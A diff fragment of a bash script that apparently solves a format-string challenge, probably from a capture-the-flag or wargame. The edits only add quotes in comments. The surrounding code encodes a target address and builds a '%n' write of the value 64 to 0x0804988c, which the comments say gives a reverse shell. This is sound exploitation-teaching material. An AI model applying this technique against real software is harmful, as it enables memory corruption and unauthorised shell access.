@@ -7,7 +7,7 @@ hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
 # Helper function, "compute '16 - 4'" gives "12"
 compute() { echo "$1" | bc | tr -d '\n' ; }
 
-# We have to write '64' at the address 0x0804988c to get the reverse shell
+# We have to write '64' at the address '0x0804988c' to get the reverse shell
 # The program use 'printf' with the input as a format string
 # We can use the '%n' conversion specifier to write a value to memory
 # We print 64 characters, then '%i$n'
@@ -24,7 +24,7 @@ PRINTF_VALUE_FILLER="%$(compute "${VALUE} - ${PRINTF_ADDRESS_SIZE}")c"
 
 # We print the printf write instruction using '%n'
 # The address '0x0804988c' is written at the start of the buffer
-# Therefore, the stack index is (buffer - %esp) / 4
+# Therefore, the stack index is '(buffer - %esp) / 4'
 BUFFER_OFFSET_TO_ESP=16
 PRINTF_WRITER_INDEX="$(compute "${BUFFER_OFFSET_TO_ESP} / 4")"
 PRINTF_WRITER="%${PRINTF_WRITER_INDEX}\$n"
